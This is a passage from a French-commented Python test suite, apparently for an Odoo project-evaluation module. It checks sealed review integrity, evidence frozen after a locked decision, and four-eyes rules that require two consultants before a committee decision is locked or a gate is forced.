                self.env["axispro.policy"].import_grid(self.cabinet, label, "g.csv", (head + base + rows).encode())
        ok = self.env["axispro.policy"].import_grid(self.cabinet, "Valide", "g.csv",
                                                    (head + base + "critere;C001;Étude;D01;G0;1;Oui;NON;x;\n").encode())
        self.assertEqual((ok.criterion_ids.critical, ok.criterion_ids.knockout, ok.criterion_ids.evidence_required),
                         (True, False, True))
        ok.go_threshold = 90
        with self.assertRaises(UserError, msg="APD READY au-dessus de BANKABLE"):
            ok.action_activate()

    def test_sceau_couvre_les_colonnes_affichees(self):
        self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf",
                     {"validity_date": "2030-12-31"})
        # La preuve déposée fait de l'analyste un auteur de l'évaluation : un second consultant verrouille.
        status, review = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/reviews",
                                   {"decision": "hold", "lock": True, "motive": "Titre foncier à produire"},
                                   token=self._relecteur())
        self.assertEqual(status, 200, review)
        record = self.env["axispro.review"].browse(review["id"])
        self.assertTrue(record.verify()["intact"])
        self.env.cr.execute("UPDATE axispro_review SET decision = 'go' WHERE id = %s", (record.id,))
        record.invalidate_recordset()
        self.assertFalse(record.verify()["intact"], "Décision modifiée en base hors du contenu scellé")

    def test_pieces_figees_par_la_decision(self):
        response = self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf",
                                {"validity_date": "2025-01-31"})
        before = response.json()["document"]["id"]
        status, review = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/reviews",
                                   {"decision": "hold", "lock": True, "motive": "Titre foncier à actualiser"},
                                   token=self._relecteur())
        self.assertEqual(status, 200, review)
        status, body = self.call("PATCH", f"/axispro/documents/{before}", {"validity_date": "2031-01-31"},
                                 token=self.token)
        self.assertEqual(status, 422, "Preuve antérieure à la décision : validité figée")
        response = self._upload(f"/axispro/dossiers/{self.dossier.id}/documents", "complement.pdf")
        after = response.json()
        self.assertTrue(after["after_lock"])
        status, body = self.call("PATCH", f"/axispro/documents/{after['id']}", {"state": "validated"}, token=self.token)
        self.assertEqual((status, body["state"]), (200, "validated"), body)
        self.env.invalidate_all()
        self.assertTrue(self.env["axispro.review"].browse(review["id"]).verify()["intact"])

    def test_capex_non_evalue_sans_anomalie(self):
        self.dossier.investment = 5_000_000
        anomalies = " ".join(self.dossier.scoring()["anomalies"])
        self.assertNotIn("investissement", anomalies, "CAPEX encore à évaluer : rien à signaler")
        self.evals["C003"].status = "not_met"
        self.assertIn("investissement", " ".join(self.dossier.scoring()["anomalies"]))

    def test_classeur_reimporte_sans_changement(self):
        headers = {"Authorization": f"Bearer {self.token}"}
        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/report.xlsx", headers=headers, timeout=60)
        self.assertEqual(response.status_code, 200)
        result = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/evaluation/import",
                               files={"file": ("classeur.xlsx", io.BytesIO(response.content),
                                               "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
                               data={"dry_run": "1"}, headers=headers, method="POST", timeout=60).json()
        self.assertEqual((result["changes"], result["errors"]), ([], []), result)

    # ─── Quatre yeux (décision du gérant, audit des rôles I2) ─────────────

    def test_quatre_yeux_sur_le_verrou_du_comite(self):
        for code in ("C001", "C003", "C005"):
            status, body = self.call("PATCH", f"/axispro/evaluations/{self.evals[code].id}", {"status": "met"},
                                     token=self.token)
            self.assertEqual(status, 200, body)
        self.env.invalidate_all()
        self.assertEqual(self.dossier.decision_inputs_by.mapped("login"), ["analyste"], "Auteur de la révision retenu")
        path = f"/axispro/dossiers/{self.dossier.id}/reviews"
        status, body = self.call("POST", path, {"decision": "go", "lock": True}, token=self.token)
        self.assertEqual(status, 403, "Seul auteur de la révision : pas de décision verrouillée")
        self.assertIn("une décision du comité engage au moins deux personnes", body["message"])
        self.assertIn("seul auteur", body["message"])
        self.env.invalidate_all()
        self.assertFalse(self.dossier.review_ids, "Refus sans revue créée")
        status, review = self.call("POST", path, {"decision": "go"}, token=self.token)
        self.assertEqual((status, review["state"]), (200, "draft"), "Une revue non verrouillée se crée librement")
        status, body = self.call("POST", f"/axispro/reviews/{review['id']}/lock", token=self.token)
        self.assertEqual(status, 403, body)
        relecteur = self._relecteur()
        status, locked = self.call("POST", f"/axispro/reviews/{review['id']}/lock", token=relecteur)
        self.assertEqual((status, locked["state"], locked["locked_by"]), (200, "locked", "Relecteur"),
                         "Deux personnes : l'analyste évalue, le relecteur verrouille")

        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/new-revision", token=relecteur)
        self.assertEqual(status, 403, "Celui qui a verrouillé ne défait pas son propre verrou")
        self.assertIn("nouvelle révision", body["message"])
        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/new-revision", token=self.token)
        self.assertEqual((status, body["revision"], body["locked"]), (200, 2, False), body)

    def test_quatre_yeux_sur_le_passage_force(self):
        self.dossier.action_advance_gate()
        status, body = self.call("PATCH", f"/axispro/evaluations/{self.evals['C002'].id}", {"status": "not_met"},
                                 token=self.token)
        self.assertEqual(status, 200, body)
        path = f"/axispro/dossiers/{self.dossier.id}/advance-gate"
        reason = {"force_reason": "Titre foncier attendu du ministère, décision du comité du 12/10"}
        status, body = self.call("POST", path, reason, token=self.token)
        self.assertEqual(status, 403, "Seul auteur de la révision : pas de passage forcé")
        self.assertIn("forcer le passage du gate G1", body["message"])
        self.assertIn("au moins deux personnes", body["message"])
        status, body = self.call("POST", path, reason, token=self._relecteur())
        self.assertEqual((status, body["current_gate"]["code"]), (200, "G2"), body)

    def test_quatre_yeux_sur_les_donnees_de_decision(self):
        """Hypothèses, fiche, modèle financier et pièces font des auteurs de la révision : qui n'a
        modifié qu'une hypothèse ou l'état d'une pièce, seul, ne verrouille pas ; deux auteurs, oui ;
        la nouvelle révision repart à vide et ne se verrouille pas sans contribution d'un autre."""
        attachment = self.env["ir.attachment"].create({"name": "titre.pdf", "raw": b"%PDF-1.4 titre"})
        seconde = self.env["axispro.dossier"].create({"name": "Seconde centrale", "promoter_id": self.promoter.id,
                                                      "company_id": self.cabinet.id})
        piece = self.env["axispro.document"].create({"dossier_id": seconde.id, "name": "Titre foncier",
                                                     "attachment_id": attachment.id})
        status, body = self.call("PATCH", f"/axispro/dossiers/{self.dossier.id}", {"dd_red_flag": "no"},
                                 token=self.token)
        self.assertEqual(status, 200, body)
        relecteur = self._relecteur()
        status, body = self.call("PATCH", f"/axispro/documents/{piece.id}", {"state": "validated"}, token=relecteur)
        self.assertEqual(status, 200, body)
        for dossier, token, what in ((self.dossier, self.token, "une hypothèse"),
                                     (seconde, relecteur, "l'état d'une pièce")):
            status, body = self.call("POST", f"/axispro/dossiers/{dossier.id}/reviews",
                                     {"decision": "go", "lock": True}, token=token)
            self.assertEqual(status, 403, f"Seul auteur ({what}) : pas de verrou")
            self.assertIn("au moins deux personnes", body["message"])

        path = f"/axispro/dossiers/{self.dossier.id}/reviews"
        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/documents",
                                 files={"file": ("bail.pdf", io.BytesIO(b"%PDF-1.4 bail"), "application/pdf")},
                                 headers={"Authorization": f"Bearer {relecteur}"}, method="POST", timeout=60)
        self.assertEqual(response.status_code, 200, response.text)
        self.env.invalidate_all()
        self.assertEqual(sorted(self.dossier.decision_inputs_by.mapped("login")), ["analyste", "relecteur"])
        status, review = self.call("POST", path, {"decision": "go", "lock": True}, token=self.token)
        self.assertEqual((status, review["state"]), (200, "locked"), "Deux auteurs : l'un d'eux verrouille")

        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/new-revision", token=relecteur)
        self.assertEqual(status, 200, body)
        self.env.invalidate_all()
        self.assertFalse(self.dossier.decision_inputs_by, "La nouvelle révision repart d'une liste vide")
        status, body = self.call("POST", path, {"decision": "go", "lock": True}, token=relecteur)
        self.assertEqual(status, 403, "Révision sans autre contribution : pas de décision à une seule personne")
        self.assertIn("aucun autre consultant n'a contribué", body["message"])
        status, body = self.call("PATCH", f"/axispro/dossiers/{self.dossier.id}", {"dd_red_flag": "yes"},
                                 token=self.token)
        self.assertEqual(status, 200, body)
        status, review = self.call("POST", path, {"decision": "go", "lock": True}, token=relecteur)
        self.assertEqual((status, review["state"], review["revision"]), (200, "locked", 2), review)

    def test_quatre_yeux_createur_du_dossier(self):
        """Le créateur du dossier en est auteur : seul, il ne verrouille pas la révision 1 ; il la
        verrouille dès qu'un autre consultant y a contribué."""
        status, created = self.call("POST", "/axispro/dossiers",
                                    {"name": "Usine de panneaux", "promoter_id": self.promoter.id}, token=self.token)
        self.assertEqual(status, 200, created)
        dossier = self.env["axispro.dossier"].browse(created["id"])
        path = f"/axispro/dossiers/{dossier.id}/reviews"
        status, body = self.call("POST", path, {"decision": "go", "lock": True}, token=self.token)
        self.assertEqual(status, 403, "Créateur seul auteur de la révision 1 : pas de verrou")
        self.assertIn("seul auteur", body["message"])
        status, body = self.call("PATCH", f"/axispro/evaluations/{dossier.evaluation_ids[:1].id}", {"status": "met"},
                                 token=self._relecteur())
        self.assertEqual(status, 200, body)
        status, review = self.call("POST", path, {"decision": "go", "lock": True}, token=self.token)
        self.assertEqual((status, review["state"], review["revision"]), (200, "locked", 1),
                         "Le créateur verrouille la révision 1 à laquelle un autre consultant a contribué")
